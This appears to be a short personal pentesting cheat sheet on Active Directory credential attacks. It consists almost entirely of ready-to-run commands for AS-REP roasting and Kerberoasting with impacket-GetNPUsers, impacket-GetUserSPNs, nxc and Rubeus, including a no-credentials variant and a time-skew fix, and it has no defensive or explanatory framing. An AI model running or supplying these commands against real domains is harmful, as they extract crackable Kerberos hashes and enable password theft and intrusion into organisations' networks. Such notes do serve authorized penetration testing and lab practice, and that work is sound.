---
title: "Kerberoasting"
date: 2024-7-6
tags: ["as_rep roasting", "impacket", "active directory", "ad", "domain controller", "Windows", "kerberoasting", "GetNPUsers"]
---

---
### AS_REP Roasting

```bash
# Multiple valid usernames
impacket-GetNPUsers <DOMAIN>/ -usersfile usernames.txt -no-pass -dc-ip <DC>
```

```bash
# Multiple valid usernames (nxc)
nxc ldap 10.10.11.10 -u usernames.txt -p '' --asreproast as_rep_hashes.txt
```

```bash
# Single user without creds
impacket-GetNPUsers -no-pass -dc-ip 10.10.11.10 <DOMAIN>/<USER>
```

### Kerberoasting

#### From Linux

```bash
# Fix time skew
sudo ntpdate -s <DC> && impacket-GetUserSPNs -request '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>
```

<small>*Note: Times skew have to be within 5 minutes in kerberos*</small>

```bash
# Kerberoasting without cred
sudo ntpdate -s <DC> && impacket-GetUserSPNs -no-preauth <USER_WITH_DONT_REQUIRE_PREAUTH> -usersfile usernames.txt -dc-host <DC_IP> <DOMAIN>/
```

#### From Windows

```cmd
.\rubeus.exe kerberoast /creduser:<DOMAIN>\<USER> /credpassword:<PASSWORD>
```

<br>